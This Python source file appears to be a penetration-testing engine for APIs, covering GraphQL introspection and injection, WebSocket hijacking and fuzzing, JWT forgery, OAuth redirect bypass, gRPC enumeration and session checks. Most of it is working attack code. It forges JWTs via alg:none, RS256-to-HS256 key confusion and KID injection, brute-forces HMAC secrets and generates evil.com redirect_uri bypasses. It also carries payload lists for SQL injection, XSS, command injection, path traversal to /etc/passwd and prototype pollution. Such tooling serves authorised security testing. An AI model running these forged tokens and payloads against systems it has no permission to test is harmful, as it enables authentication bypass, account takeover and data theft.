"""
Advanced API Testing Engine
============================
Supports:
- GraphQL (introspection, batching, query depth, BOLA, injection)
- gRPC (reflection, method enumeration, message fuzzing)
- WebSocket (message interception, injection, CSWSH)
- SOAP/WSDL (enumeration, XXE, injection)
- MQTT (topic enumeration, message injection)
- OAuth2/OIDC (flow testing, token manipulation)
- JWT Advanced (alg:none, key confusion, jku/x5u injection)
"""

import asyncio
import json
import re
import time
import uuid
import hashlib
import hmac
import base64
import struct
from typing import Dict, Any, Optional, List, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin


# ============================================================================
# GRAPHQL ENGINE
# ============================================================================

class GraphQLEngine:
    """
    Comprehensive GraphQL security testing:
    - Introspection queries
    - Depth/complexity attacks
    - Batch query attacks
    - Field suggestion bruteforcing
    - IDOR via object type enumeration
    - SQL injection in GraphQL variables
    - Authorization bypass
    """
    
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args { ...InputValue }
        }
      }
    }
    
    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args { ...InputValue }
        type { ...TypeRef }
        isDeprecated
        deprecationReason
      }
      inputFields { ...InputValue }
      interfaces { ...TypeRef }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes { ...TypeRef }
    }
    
    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }
    
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
          }
        }
      }
    }
    """
    
    def __init__(self):
        self.schema: Dict = {}
        self.endpoints: List[str] = []
        self.findings: List[Dict] = []
    
    async def introspect(self, url: str, headers: Dict = None,
                        send_fn=None) -> Dict:
        """Perform introspection query"""
        payload = {"query": self.INTROSPECTION_QUERY}
        
        result = await self._send_graphql(url, payload, headers, send_fn)
        
        if result and "data" in result:
            self.schema = result["data"].get("__schema", {})
            
            # Extract useful info
            types = self.schema.get("types", [])
            queries = []
            mutations = []
            
            for t in types:
                if t.get("name") == self.schema.get("queryType", {}).get("name"):
                    queries = [f["name"] for f in (t.get("fields") or [])]
                elif t.get("name") == self.schema.get("mutationType", {}).get("name"):
                    mutations = [f["name"] for f in (t.get("fields") or [])]
            
            self.findings.append({
                "type": "introspection_enabled",
                "severity": "low",
                "detail": f"Found {len(queries)} queries, {len(mutations)} mutations"
            })
            
            return {
                "introspection": True,
                "queries": queries,
                "mutations": mutations,
                "types": [t["name"] for t in types if not t["name"].startswith("__")],
                "total_types": len(types)
            }
        
        return {"introspection": False, "error": "Introspection disabled or failed"}
    
    async def test_depth_limit(self, url: str, headers: Dict = None,
                              max_depth: int = 20, send_fn=None) -> Dict:
        """Test for query depth limit bypass"""
        # Build nested query
        results = []
        for depth in [5, 10, 15, 20, 50]:
            if depth > max_depth:
                break
            
            # Create a deeply nested query
            query = "{ " + "__typename " * depth + "}"
            payload = {"query": query}
            
            result = await self._send_graphql(url, payload, headers, send_fn)
            
            results.append({
                "depth": depth,
                "success": "errors" not in (result or {}),
                "response_size": len(json.dumps(result)) if result else 0
            })
        
        # Check if deep queries succeed
        max_successful = max((r["depth"] for r in results if r["success"]), default=0)
        
        if max_successful > 10:
            self.findings.append({
                "type": "no_depth_limit",
                "severity": "medium",
                "detail": f"Queries up to depth {max_successful} succeed - DoS possible"
            })
        
        return {"results": results, "max_depth_allowed": max_successful}
    
    async def test_batch_queries(self, url: str, headers: Dict = None,
                                send_fn=None) -> Dict:
        """Test batch query support (potential for DoS and data extraction)"""
        # Single query to compare
        single = {"query": "{ __typename }"}
        
        # Batch of queries
        batch = [{"query": "{ __typename }"} for _ in range(10)]
        
        # Array batch
        array_result = await self._send_graphql(url, batch, headers, send_fn)
        
        # Alias-based batch
        alias_query = " ".join(f"q{i}: __typename" for i in range(50))
        alias_payload = {"query": f"{{ {alias_query} }}"}
        alias_result = await self._send_graphql(url, alias_payload, headers, send_fn)
        
        batching_supported = isinstance(array_result, list) and len(array_result) > 1
        alias_supported = alias_result and "errors" not in alias_result
        
        if batching_supported:
            self.findings.append({
                "type": "batch_queries_allowed",
                "severity": "medium",
                "detail": "Array batching enabled - brute force and DoS possible"
            })
        
        return {
            "array_batching": batching_supported,
            "alias_batching": alias_supported,
            "findings": self.findings[-1:] if batching_supported else []
        }
    
    async def test_injection(self, url: str, query_template: str,
                            variable_name: str, headers: Dict = None,
                            send_fn=None) -> Dict:
        """Test for injection in GraphQL variables"""
        payloads = [
            "'", "\"", "' OR '1'='1", "{{7*7}}",
            "${7*7}", "'; DROP TABLE--", "<script>alert(1)</script>",
            "../../../etc/passwd", "| id", "; id"
        ]
        
        results = []
        for payload in payloads:
            gql_payload = {
                "query": query_template,
                "variables": {variable_name: payload}
            }
            
            result = await self._send_graphql(url, gql_payload, headers, send_fn)
            result_str = json.dumps(result) if result else ""
            
            interesting = False
            if any(pattern in result_str.lower() for pattern in 
                   ["sql", "syntax", "error", "49", "root:", "uid="]):
                interesting = True
                self.findings.append({
                    "type": "graphql_injection",
                    "severity": "high",
                    "payload": payload,
                    "variable": variable_name
                })
            
            results.append({
                "payload": payload,
                "interesting": interesting,
                "response_snippet": result_str[:200]
            })
        
        return {"results": results, "findings": self.findings}
    
    async def _send_graphql(self, url: str, payload: Any, 
                           headers: Dict = None, send_fn=None) -> Any:
        """Send GraphQL request"""
        if send_fn:
            return await send_fn(url, payload, headers)
        
        try:
            import aiohttp
            hdrs = {"Content-Type": "application/json"}
            if headers:
                hdrs.update(headers)
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, headers=hdrs, 
                                       ssl=False, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    return await resp.json()
        except Exception:
            return None


# ============================================================================
# WEBSOCKET ENGINE
# ============================================================================

class WebSocketEngine:
    """
    WebSocket security testing:
    - Connection hijacking (CSWSH)
    - Message injection
    - Authentication bypass
    - Cross-protocol attacks
    """
    
    def __init__(self):
        self.connections: Dict[str, Any] = {}
        self.messages: List[Dict] = []
        self.findings: List[Dict] = []
    
    async def connect(self, url: str, headers: Dict = None,
                     origin: str = None) -> Dict:
        """Establish WebSocket connection"""
        try:
            import websockets
            
            extra_headers = headers or {}
            if origin:
                extra_headers["Origin"] = origin
            
            ws = await websockets.connect(url, extra_headers=extra_headers)
            conn_id = str(uuid.uuid4())[:8]
            self.connections[conn_id] = ws
            
            return {
                "connected": True,
                "id": conn_id,
                "url": url,
                "origin": origin
            }
        except Exception as e:
            return {"connected": False, "error": str(e)}
    
    async def test_cswsh(self, url: str, legitimate_origin: str,
                        malicious_origin: str = "https://evil.com") -> Dict:
        """Test for Cross-Site WebSocket Hijacking"""
        # Try with legitimate origin
        legit = await self.connect(url, origin=legitimate_origin)
        
        # Try with malicious origin
        evil = await self.connect(url, origin=malicious_origin)
        
        # Try with no origin
        no_origin = await self.connect(url)
        
        vulnerable = evil.get("connected", False) or no_origin.get("connected", False)
        
        if vulnerable:
            self.findings.append({
                "type": "cswsh",
                "severity": "high",
                "detail": f"WebSocket accepts connections from {malicious_origin}"
            })
        
        return {
            "legitimate_origin": legit,
            "malicious_origin": evil,
            "no_origin": no_origin,
            "vulnerable": vulnerable
        }
    
    async def send_message(self, conn_id: str, message: str) -> Dict:
        """Send a message on a WebSocket connection"""
        ws = self.connections.get(conn_id)
        if not ws:
            return {"error": "Connection not found"}
        
        try:
            await ws.send(message)
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            
            self.messages.append({
                "conn_id": conn_id,
                "sent": message,
                "received": response,
                "timestamp": time.time()
            })
            
            return {"sent": message, "received": response}
        except asyncio.TimeoutError:
            return {"sent": message, "received": None, "timeout": True}
        except Exception as e:
            return {"error": str(e)}
    
    async def fuzz_messages(self, conn_id: str, base_message: str,
                           payloads: List[str] = None) -> List[Dict]:
        """Fuzz WebSocket messages"""
        if not payloads:
            payloads = [
                "' OR '1'='1", "<script>alert(1)</script>",
                "{{7*7}}", "${7*7}", "../../../etc/passwd",
                '{"__proto__":{"admin":true}}',
                '{"constructor":{"prototype":{"admin":true}}}',
                "\x00" * 100, "A" * 10000,
            ]
        
        results = []
        for payload in payloads:
            # Inject payload into message
            if base_message.startswith("{"):
                # JSON message - try injecting
                try:
                    msg = json.loads(base_message)
                    # Inject into first string value
                    for key in msg:
                        if isinstance(msg[key], str):
                            msg[key] = payload
                            break
                    test_msg = json.dumps(msg)
                except json.JSONDecodeError:
                    test_msg = payload
            else:
                test_msg = payload
            
            result = await self.send_message(conn_id, test_msg)
            results.append({
                "payload": payload[:100],
                "response": str(result.get("received", ""))[:200],
                "error": result.get("error", "")
            })
        
        return results


# ============================================================================
# JWT ADVANCED ENGINE
# ============================================================================

class JWTEngine:
    """
    Advanced JWT vulnerability testing:
    - Algorithm confusion (alg:none, RS256->HS256)
    - Key brute force
    - JKU/X5U injection
    - KID injection
    - Claim manipulation
    - Token analysis
    """
    
    def __init__(self):
        self.findings: List[Dict] = []
    
    def decode_jwt(self, token: str) -> Dict:
        """Decode JWT without verification"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return {"error": "Invalid JWT format"}
            
            header = json.loads(self._b64_decode(parts[0]))
            payload = json.loads(self._b64_decode(parts[1]))
            
            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
                "algorithm": header.get("alg", "unknown"),
                "claims": {
                    "issuer": payload.get("iss"),
                    "subject": payload.get("sub"),
                    "audience": payload.get("aud"),
                    "expiration": payload.get("exp"),
                    "issued_at": payload.get("iat"),
                    "custom": {k: v for k, v in payload.items() 
                              if k not in ["iss", "sub", "aud", "exp", "iat", "nbf", "jti"]}
                }
            }
        except Exception as e:
            return {"error": str(e)}
    
    def test_alg_none(self, token: str) -> List[str]:
        """Generate tokens with alg:none attack"""
        decoded = self.decode_jwt(token)
        if "error" in decoded:
            return []
        
        payload_b64 = token.split(".")[1]
        
        # Various none variants
        none_variants = ["none", "None", "NONE", "nOnE"]
        tokens = []
        
        for variant in none_variants:
            header = {"alg": variant, "typ": "JWT"}
            header_b64 = self._b64_encode(json.dumps(header))
            # Empty signature
            forged_token = f"{header_b64}.{payload_b64}."
            tokens.append(forged_token)
        
        self.findings.append({
            "type": "alg_none_attack",
            "severity": "critical",
            "tokens_generated": len(tokens),
            "description": "Forged tokens with alg:none - test if server accepts them"
        })
        
        return tokens
    
    def test_key_confusion(self, token: str, public_key: str) -> str:
        """
        Algorithm confusion attack: RS256 -> HS256
        Signs with public key as HMAC secret
        """
        decoded = self.decode_jwt(token)
        if "error" in decoded:
            return ""
        
        # Change algorithm to HS256
        header = {"alg": "HS256", "typ": "JWT"}
        header_b64 = self._b64_encode(json.dumps(header))
        payload_b64 = token.split(".")[1]
        
        # Sign with public key as HMAC secret
        message = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(public_key.encode(), message, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
        
        forged = f"{header_b64}.{payload_b64}.{sig_b64}"
        
        self.findings.append({
            "type": "key_confusion",
            "severity": "critical",
            "description": "RS256->HS256 algorithm confusion token generated"
        })
        
        return forged
    
    def test_kid_injection(self, token: str) -> List[str]:
        """Generate tokens with KID (Key ID) injection payloads"""
        decoded = self.decode_jwt(token)
        if "error" in decoded:
            return []
        
        payload_b64 = token.split(".")[1]
        tokens = []
        
        kid_payloads = [
            "../../dev/null",           # Empty key
            "/dev/null",                # Empty key (absolute)
            "../../proc/self/environ",  # Read env vars
            "| cat /etc/passwd",        # Command injection
            "'; SELECT 'key'--",        # SQL injection
            "../../../etc/hostname",     # File read
        ]
        
        for kid in kid_payloads:
            header = {
                "alg": "HS256",
                "typ": "JWT",
                "kid": kid
            }
            header_b64 = self._b64_encode(json.dumps(header))
            
            # Sign with empty key (for /dev/null)
            message = f"{header_b64}.{payload_b64}".encode()
            signature = hmac.new(b"", message, hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
            
            tokens.append(f"{header_b64}.{payload_b64}.{sig_b64}")
        
        self.findings.append({
            "type": "kid_injection",
            "severity": "critical",
            "payloads_generated": len(tokens)
        })
        
        return tokens
    
    def test_jku_injection(self, token: str, evil_jwks_url: str) -> str:
        """Generate token with JKU pointing to attacker's JWKS"""
        decoded = self.decode_jwt(token)
        if "error" in decoded:
            return ""
        
        payload_b64 = token.split(".")[1]
        
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "jku": evil_jwks_url  # Points to attacker's JWKS
        }
        header_b64 = self._b64_encode(json.dumps(header))
        
        # Signature would need attacker's private key
        forged = f"{header_b64}.{payload_b64}.ATTACKER_SIGNATURE"
        
        self.findings.append({
            "type": "jku_injection",
            "severity": "critical",
            "description": f"JKU header points to: {evil_jwks_url}"
        })
        
        return forged
    
    def manipulate_claims(self, token: str, 
                         modifications: Dict[str, Any]) -> str:
        """Modify JWT claims and re-encode (without valid signature)"""
        decoded = self.decode_jwt(token)
        if "error" in decoded:
            return ""
        
        payload = decoded["payload"]
        payload.update(modifications)
        
        header_b64 = token.split(".")[0]
        payload_b64 = self._b64_encode(json.dumps(payload))
        
        # Keep original signature (for testing if server validates)
        original_sig = token.split(".")[2]
        
        return f"{header_b64}.{payload_b64}.{original_sig}"
    
    def brute_force_secret(self, token: str, wordlist: List[str]) -> Optional[str]:
        """Brute force JWT HMAC secret"""
        parts = token.split(".")
        if len(parts) != 3:
            return None
        
        message = f"{parts[0]}.{parts[1]}".encode()
        target_sig = parts[2]
        
        # Add padding for base64
        target_bytes = base64.urlsafe_b64decode(target_sig + "==")
        
        for secret in wordlist:
            computed = hmac.new(secret.encode(), message, hashlib.sha256).digest()
            if computed == target_bytes:
                self.findings.append({
                    "type": "weak_jwt_secret",
                    "severity": "critical",
                    "secret": secret
                })
                return secret
        
        return None
    
    def _b64_encode(self, data: str) -> str:
        return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")
    
    def _b64_decode(self, data: str) -> str:
        padded = data + "=" * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(padded).decode()


# ============================================================================
# OAUTH2/OIDC ENGINE
# ============================================================================

class OAuthEngine:
    """
    OAuth2/OIDC security testing:
    - Open redirect in redirect_uri
    - State parameter bypass
    - PKCE downgrade
    - Token leakage
    - Scope escalation
    - Client credential stuffing
    """
    
    def __init__(self):
        self.findings: List[Dict] = []
    
    def test_redirect_uri_manipulation(self, auth_url: str, 
                                       client_id: str,
                                       legitimate_redirect: str) -> List[Dict]:
        """Generate redirect_uri manipulation test cases"""
        tests = []
        parsed = urlparse(legitimate_redirect)
        domain = parsed.netloc
        
        # Various bypass techniques
        malicious_redirects = [
            f"https://evil.com",
            f"https://{domain}.evil.com",
            f"https://evil.com/{domain}",
            f"https://{domain}@evil.com",
            f"https://{domain}%40evil.com",
            f"https://{domain}/../evil.com",
            f"https://{domain}/..;/evil.com",
            f"https://{domain}%2f..%2fevil.com",
            f"{legitimate_redirect}/../../../evil.com",
            f"{legitimate_redirect}?next=https://evil.com",
            f"{legitimate_redirect}#@evil.com",
            f"{legitimate_redirect}/.evil.com",
            f"https://{domain}%252f..%252fevil.com",
        ]
        
        for redirect in malicious_redirects:
            tests.append({
                "redirect_uri": redirect,
                "full_url": f"{auth_url}?client_id={client_id}&redirect_uri={redirect}&response_type=code",
                "technique": "redirect_uri_manipulation"
            })
        
        return tests
    
    def test_state_bypass(self, auth_url: str) -> List[Dict]:
        """Test state parameter validation"""
        tests = [
            {"description": "No state parameter", "state": None},
            {"description": "Empty state", "state": ""},
            {"description": "Predictable state", "state": "1234"},
            {"description": "Reused state", "state": "previously_used_state"},
            {"description": "XSS in state", "state": "<script>alert(1)</script>"},
        ]
        return tests
    
    def test_pkce_downgrade(self, token_url: str) -> List[Dict]:
        """Test if PKCE can be bypassed"""
        tests = [
            {
                "description": "Request without code_verifier",
                "params": {"grant_type": "authorization_code", "code": "LEAKED_CODE"},
                "expected": "Should be rejected if PKCE was used in auth request"
            },
            {
                "description": "Request with wrong code_verifier",
                "params": {
                    "grant_type": "authorization_code",
                    "code": "LEAKED_CODE",
                    "code_verifier": "wrong_verifier"
                },
                "expected": "Should be rejected"
            },
            {
                "description": "Implicit flow (bypass PKCE entirely)",
                "params": {"response_type": "token"},
                "expected": "Check if implicit flow is enabled alongside PKCE"
            }
        ]
        return tests
    
    def analyze_token_response(self, response: Dict) -> Dict:
        """Analyze OAuth token response for security issues"""
        issues = []
        
        access_token = response.get("access_token", "")
        refresh_token = response.get("refresh_token", "")
        
        # Check token type
        if access_token and "." in access_token:
            # Likely JWT - decode and analyze
            jwt_engine = JWTEngine()
            decoded = jwt_engine.decode_jwt(access_token)
            if "error" not in decoded:
                # Check expiration
                exp = decoded.get("payload", {}).get("exp")
                if exp and exp - time.time() > 86400:
                    issues.append({
                        "type": "long_lived_token",
                        "severity": "medium",
                        "detail": f"Token expires in {(exp - time.time()) / 3600:.0f} hours"
                    })
                
                # Check scope in token
                scope = decoded.get("payload", {}).get("scope", "")
                if "admin" in scope.lower() or "*" in scope:
                    issues.append({
                        "type": "excessive_scope",
                        "severity": "high",
                        "detail": f"Token has scope: {scope}"
                    })
        
        # Check for refresh token
        if not refresh_token:
            issues.append({
                "type": "no_refresh_token",
                "severity": "info",
                "detail": "No refresh token - may indicate stateless design"
            })
        
        # Check token_type
        if response.get("token_type", "").lower() != "bearer":
            issues.append({
                "type": "non_bearer_token",
                "severity": "info",
                "detail": f"Token type: {response.get('token_type')}"
            })
        
        self.findings.extend(issues)
        return {"issues": issues, "token_decoded": access_token[:50] + "..." if access_token else ""}


# ============================================================================
# GRPC ENGINE
# ============================================================================

class GRPCEngine:
    """
    gRPC security testing:
    - Service reflection/enumeration
    - Method fuzzing
    - Authentication bypass
    - Message manipulation
    """
    
    def __init__(self):
        self.services: List[Dict] = []
        self.findings: List[Dict] = []
    
    async def enumerate_services(self, host: str, port: int = 443) -> Dict:
        """Enumerate gRPC services using reflection"""
        # Using grpcurl-like approach
        import subprocess
        
        try:
            result = subprocess.run(
                ["grpcurl", "-plaintext", f"{host}:{port}", "list"],
                capture_output=True, text=True, timeout=30
            )
            
            services = [s.strip() for s in result.stdout.strip().split('\n') if s.strip()]
            self.services = [{"name": s, "host": host, "port": port} for s in services]
            
            return {"services": services, "count": len(services)}
        except FileNotFoundError:
            return {"error": "grpcurl not installed"}
        except subprocess.TimeoutExpired:
            return {"error": "Connection timeout"}
        except Exception as e:
            return {"error": str(e)}
    
    async def describe_service(self, host: str, port: int, 
                              service: str) -> Dict:
        """Get service description (methods and message types)"""
        import subprocess
        
        try:
            result = subprocess.run(
                ["grpcurl", "-plaintext", f"{host}:{port}", "describe", service],
                capture_output=True, text=True, timeout=30
            )
            
            return {"service": service, "description": result.stdout}
        except Exception as e:
            return {"error": str(e)}
    
    def generate_fuzz_messages(self, message_schema: Dict) -> List[Dict]:
        """Generate fuzz payloads for gRPC messages"""
        payloads = []
        
        # For each field in the message
        for field_name, field_type in message_schema.items():
            if field_type == "string":
                for payload in ["A" * 10000, "' OR '1'='1", "<script>", "../../../etc/passwd"]:
                    msg = dict(message_schema)
                    msg[field_name] = payload
                    payloads.append(msg)
            elif field_type in ["int32", "int64"]:
                for payload in [0, -1, 2**31 - 1, 2**63 - 1, -2**31]:
                    msg = dict(message_schema)
                    msg[field_name] = payload
                    payloads.append(msg)
        
        return payloads


# ============================================================================
# AUTHENTICATION TESTING ENGINE
# ============================================================================

class AuthTestEngine:
    """
    Comprehensive authentication testing:
    - Session management
    - Password reset flows
    - MFA bypass
    - Rate limiting
    - Account enumeration
    - Credential stuffing detection
    """
    
    def __init__(self):
        self.findings: List[Dict] = []
    
    def test_session_fixation(self, pre_auth_cookies: Dict, 
                            post_auth_cookies: Dict) -> Dict:
        """Check if session token changes after authentication"""
        # Compare session cookies
        session_keys = ["JSESSIONID", "PHPSESSID", "ASP.NET_SessionId", 
                       "session", "sid", "token"]
        
        for key in session_keys:
            pre = pre_auth_cookies.get(key)
            post = post_auth_cookies.get(key)
            
            if pre and post and pre == post:
                self.findings.append({
                    "type": "session_fixation",
                    "severity": "high",
                    "detail": f"Session cookie '{key}' unchanged after login"
                })
                return {"vulnerable": True, "cookie": key}
        
        return {"vulnerable": False}
    
    def test_session_properties(self, cookies: List[Dict]) -> List[Dict]:
        """Analyze session cookie security properties"""
        issues = []
        
        for cookie in cookies:
            name = cookie.get("name", "")
            
            if not cookie.get("httpOnly"):
                issues.append({
                    "cookie": name,
                    "issue": "Missing HttpOnly flag",
                    "severity": "medium",
                    "impact": "Cookie accessible via JavaScript (XSS)"
                })
            
            if not cookie.get("secure"):
                issues.append({
                    "cookie": name,
                    "issue": "Missing Secure flag",
                    "severity": "medium",
                    "impact": "Cookie sent over HTTP (MITM)"
                })
            
            samesite = cookie.get("sameSite", "").lower()
            if samesite not in ["strict", "lax"]:
                issues.append({
                    "cookie": name,
                    "issue": f"SameSite={samesite or 'None'}",
                    "severity": "low",
                    "impact": "Cross-site request possible"
                })
        
        self.findings.extend(issues)
        return issues
    
    def generate_account_enum_tests(self, login_url: str) -> List[Dict]:
        """Generate account enumeration test cases"""
        return [
            {
                "test": "Different error messages",
                "valid_user": {"username": "admin", "password": "wrong"},
                "invalid_user": {"username": "nonexistent_user_xyz", "password": "wrong"},
                "check": "Compare response body, status, time"
            },
            {
                "test": "Response time difference",
                "description": "Valid users may take longer (password hash check)",
                "iterations": 10
            },
            {
                "test": "Password reset enumeration",
                "valid_email": "admin@target.com",
                "invalid_email": "nonexistent@target.com",
                "check": "Different responses indicate user existence"
            },
            {
                "test": "Registration enumeration",
                "description": "'Email already taken' reveals existing accounts"
            }
        ]
    
    def analyze_rate_limiting(self, responses: List[Dict]) -> Dict:
        """Analyze rate limiting behavior"""
        status_codes = [r.get("status_code", 0) for r in responses]
        response_times = [r.get("time_ms", 0) for r in responses]
        
        # Check for 429 or other rate limit indicators
        rate_limited_at = None
        for i, status in enumerate(status_codes):
            if status == 429 or status == 503:
                rate_limited_at = i
                break
        
        # Check response time increase (progressive delay)
        time_increasing = False
        if len(response_times) > 5:
            first_five_avg = sum(response_times[:5]) / 5
            last_five_avg = sum(response_times[-5:]) / 5
            time_increasing = last_five_avg > first_five_avg * 2
        
        result = {
            "total_requests": len(responses),
            "rate_limited_at": rate_limited_at,
            "progressive_delay": time_increasing,
            "rate_limiting_present": rate_limited_at is not None or time_increasing
        }
        
        if not result["rate_limiting_present"]:
            self.findings.append({
                "type": "no_rate_limiting",
                "severity": "medium",
                "detail": f"No rate limiting after {len(responses)} requests"
            })
        
        return result
